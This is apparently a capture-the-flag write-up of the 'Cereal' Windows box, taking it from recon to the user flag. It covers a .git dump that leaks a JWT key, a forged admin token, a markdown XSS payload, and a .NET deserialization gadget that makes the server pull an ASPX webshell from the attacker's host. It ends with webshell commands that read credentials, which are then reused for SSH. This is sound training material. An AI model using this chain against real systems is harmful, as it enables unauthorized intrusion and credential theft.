## Overview

Cereal is a hard-difficulty Windows box fronted by IIS with two SSL-cert vhosts, `cereal.htb` and `source.cereal.htb`. The path to user is a four-step web chain: an exposed `.git` directory leaks the application source (and an old commit with the hardcoded JWT signing key), the key forges an admin session, an XSS bug in an outdated markdown renderer runs attacker JavaScript in the privileged/localhost context, and that JS triggers a localhost-only .NET deserialization endpoint to drop an ASPX webshell. From the webshell, a plaintext-credential database hands over SSH access. This post covers recon through the user flag.

Hard custom web chain — .git dump for a hardcoded JWT key, markdown XSS, and a bespoke localhost .NET deser gadget using the app's own class — heavy bespoke effort with only a minor library CVE.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH | reachable, no creds yet |
| 80/tcp | HTTP (IIS) | redirects to HTTPS |
| 443/tcp | HTTPS (IIS) | SSL cert exposes `cereal.htb` + `source.cereal.htb` |

```bash
nmap -p- --min-rate=1000 -T4 10.129.29.182
nmap -p22,80,443 -sC -sV 10.129.29.182
```

The TLS certificate lists two virtual hosts. Add both to `/etc/hosts`:

```bash
echo '10.129.29.182 cereal.htb source.cereal.htb' | sudo tee -a /etc/hosts
```

`cereal.htb` is a login page with nothing useful in the source. `source.cereal.htb` throws a compilation error that discloses the source directory `C:\inetpub\source` — a strong hint that the second vhost serves the project tree.

## Enumeration

Directory brute-forcing both vhosts surfaces an `uploads` folder and, critically, an exposed `.git` directory on `source.cereal.htb`:

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u https://source.cereal.htb -k -t 50 -x aspx
```

The whole repository can be reconstructed with git-dumper:

```bash
git-dumper https://source.cereal.htb/.git ./src
cd src
```

Reviewing the C# source, `Services/UserService.cs` signs JWTs with a key that is `****` (redacted) in the current code. Walking the commit history recovers the original:

```bash
git log -p
# -    var key = Encoding.ASCII.GetBytes("secretlhfIH&FY*#oysuflkhskjfhefesf");
# +    var key = Encoding.ASCII.GetBytes("****");
```

The key was only redacted in a later commit — the live application still uses it.

## Foothold

**1. Forge an admin JWT.** The auth flow signs tokens HS256 with the leaked key, and `userid 1` is the admin. The client stores the token in `localStorage` under `currentUser`, so a forged token logs us in.

```bash
python3 -c "import jwt; print(jwt.encode({'unique_name':'1'}, 'secretlhfIH&FY*#oysuflkhskjfhefesf', algorithm='HS256'))"
```

**2. Markdown XSS in the admin panel.** Cereal requests are rendered as Markdown with `react-marked-markdown@1.4.6`, vulnerable to a `javascript:` link sanitization bypass. Parentheses are blocked by markdown syntax, so backticks are used instead. Submitting a request with this title runs arbitrary JS in the admin context (which makes requests from `localhost`):

```text
[XSS](javascript: document.write`<img src='http://<lhost>/test' />`)
```

A hit on the local HTTP server confirms execution.

**3. Localhost-only .NET deserialization.** The `/requests/{id}` endpoint is IP-restricted to `127.0.0.1`/`::1` and deserializes stored JSON with `TypeNameHandling.Auto`. A keyword blacklist blocks the usual ysoserial gadgets (`objectdataprovider`, `windowsidentity`, `system`), so the application's *own* `Cereal.DownloadHelper` class is used as the gadget — setting its `URL`/`FilePath` properties triggers `WebClient.DownloadFile`:

```json
{
  "$type": "Cereal.DownloadHelper, Cereal, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null",
  "URL": "http://<lhost>/cmd.aspx",
  "FilePath": "C:\\inetpub\\source\\uploads\\cmd.aspx"
}
```

Because the endpoint is localhost-only, the request is fired *from* the XSS payload (an authenticated `XMLHttpRequest` carrying the forged token). Host the webshell, then trigger the chain:

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx
python3 -m http.server 80
```

The server prefixes downloaded filenames with `21098374243-`, so the shell lands at:

```bash
curl -sk "https://source.cereal.htb/uploads/21098374243-cmd.aspx?cmd=whoami"
```

**4. Loot plaintext creds.** The web root holds a SQLite database with plaintext credentials:

```bash
curl -sk "https://source.cereal.htb/uploads/21098374243-cmd.aspx?cmd=type+C:\inetpub\cereal\db\cereal.db"
# -> sonny:<redacted>
```

Those credentials are reused for SSH:

```bash
sshpass -p '<redacted>' ssh -o StrictHostKeyChecking=no sonny@10.129.29.182
```

## User flag

```bash
type C:\Users\sonny\Desktop\user.txt   # HTB{...}
```

Access as `sonny` achieved.

Privilege escalation is left as an exercise — this post stops at user.
